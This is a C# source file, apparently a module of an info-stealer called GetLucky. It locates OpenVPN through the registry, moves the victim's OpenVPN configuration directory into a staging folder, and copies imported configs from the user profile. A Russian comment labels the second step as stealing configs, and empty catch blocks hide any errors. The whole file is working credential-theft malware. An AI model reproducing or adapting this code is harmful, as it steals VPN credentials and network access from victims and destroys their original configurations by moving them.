using Microsoft.Win32;
using System.IO;

namespace GetLucky
{
    class OpenVPN
    {
        public static int count = 0;
        public static void GetOpenVPN(string GetLucky_Dir)
        {
                try
                {
                RegistryKey localMachineKey = Registry.LocalMachine;
                    string[] names = localMachineKey.OpenSubKey("SOFTWARE").GetSubKeyNames();
                    foreach (string i in names)
                    {
                        if (i == "OpenVPN")
                        {
                            Directory.CreateDirectory(GetLucky_Dir + "\\VPN\\OpenVPN");
                            try
                            {
                                string dir = localMachineKey.OpenSubKey("SOFTWARE").OpenSubKey("OpenVPN").GetValue("config_dir").ToString();
                                DirectoryInfo dire = new DirectoryInfo(dir);
                                dire.MoveTo(GetLucky_Dir + "\\VPN\\OpenVPN");
                            count++;
                            }
                            catch {}

                        }
                    }
                }
                catch  {}
            //Стиллинг импортированных конфигов *New
            try
            {
                string dir = Help.UserProfile + "\\OpenVPN\\config\\conf\\";
                if (Directory.Exists(dir))
                {
                    foreach (FileInfo file in new DirectoryInfo(dir).GetFiles())

                    {
                        Directory.CreateDirectory(GetLucky_Dir + "\\VPN\\OpenVPN\\config\\conf\\");
                        file.CopyTo(GetLucky_Dir + "\\VPN\\OpenVPN\\config\\conf\\" + file.Name);
                    }
                    count++;
                }
                else
                {
                    return;
                }



            }
            catch  {}

        }
    }
}
